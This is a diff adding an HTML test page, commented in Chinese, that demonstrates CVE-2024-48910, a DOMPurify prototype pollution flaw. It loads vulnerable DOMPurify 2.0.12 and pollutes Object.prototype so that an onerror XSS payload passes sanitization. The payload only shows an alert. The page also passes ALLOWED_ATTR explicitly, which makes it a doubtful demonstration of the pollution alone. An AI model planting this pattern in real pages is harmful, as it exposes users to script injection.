@@ -1,0 +1,48 @@
+<!-- 
+CVE-2024-48910
+
+Prototype Pollution
+Affecting dompurify package, versions <2.4.2 
+
+-->
+
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <title>Prototype Pollution 測試</title>
+    <!-- 引入 Vulns  DOMPurify -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js"></script>
+</head>
+<body>
+    <h1>Prototype Pollution 測試</h1>
+    <div id="result"></div>
+
+    <script>
+        // 定義一個簡單的對象
+        const obj = {
+            name: "測試對象"
+        };
+
+        obj.__proto__.hasOwnProperty = Object;
+        obj.constructor.prototype.ALLOWED_ATTR = ["src", "onerror"];
+
+        console.log("污染後的 obj:", obj);
+        console.log("obj.hasOwnProperty('name'):", obj.hasOwnProperty('name')); // 應該正常工作或出錯
+
+ 
+        const dirtyHTML = '<img src="x" onerror="alert(\'XSS via onerror\')">';
+        const cleanHTML = DOMPurify.sanitize(dirtyHTML, {
+            ALLOWED_ATTR: obj.ALLOWED_ATTR
+        });
+
+        document.getElementById("result").innerHTML = `
+            <p>消毒後的 HTML: ${cleanHTML}</p>
+        `;
+
+        console.log("Object.prototype.ALLOWED_ATTR:", Object.prototype.ALLOWED_ATTR);
+        console.log("Object.prototype.hasOwnProperty:", Object.prototype.hasOwnProperty);
+    </script>
+</body>
+</html>
